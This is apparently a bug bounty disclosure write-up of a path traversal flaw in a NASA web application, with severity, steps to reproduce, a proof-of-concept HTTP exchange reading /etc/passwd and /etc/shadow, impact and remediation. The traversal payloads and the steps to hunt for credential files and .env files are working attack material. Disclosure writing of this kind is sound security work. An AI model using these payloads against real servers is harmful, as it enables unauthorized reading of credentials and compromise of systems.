# Title: Hacking into NASA - Reading sensitive files via Path Traversal

- **Platform**: DoD VDP
- **Program**: NASA - Vulnerability Disclosure Program
- **Severity**: Critical (P1)
- **Date**: 2024-04-07
- **Researcher**: Jessar Qais (J3554R)
- **Bounty**: Letter of Appreciation

## Summary
A path traversal vulnerability was discovered on a NASA web application that allowed reading sensitive server-side files, including `/etc/shadow`. The vulnerability was found by fuzzing the `filename` parameter with path traversal payloads.

## Technical Details
While fuzzing a NASA application in Caido Pro, the researcher tested the `filename` parameter with the JHaddix LFI wordlist. A payload containing `../` sequences returned a 200 status code with the contents of `/etc/passwd`. Further testing revealed the ability to read `/etc/shadow`, indicating the web server was running as root, which significantly increased the severity.

## Steps to Reproduce
1. Identify a file download or processing endpoint with a `filename` parameter
2. Use a fuzzing tool with LFI/path traversal wordlists
3. Test basic traversal: `../../../../etc/passwd`
4. If successful, enumerate more sensitive files: `/etc/shadow`, `.env`, config files
5. Look for credentials, keys, and other sensitive data

## Proof of Concept
```
GET /download?filename=../../../../etc/passwd HTTP/1.1
Host: vulnerable.nasa.gov

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 1042

root:x:0:0:root:/root:/bin/bash
...

GET /download?filename=../../../../etc/shadow HTTP/1.1
Host: vulnerable.nasa.gov

HTTP/1.1 200 OK
root:$6$xyz...:18937:0:99999:7:::
...
```

## Impact
- Read arbitrary files from the server filesystem
- Access to password hashes in `/etc/shadow`
- Potential privilege escalation if credentials are exposed
- Chaining with log poisoning for RCE

## Remediation
NASA implemented proper input validation on the `filename` parameter, restricting file access to an allowed directory and preventing directory traversal sequences.

## References
- https://blog.jessar.dev/2024/04/07/nasa-lfi/
- https://bugcrowd.com/J3554R
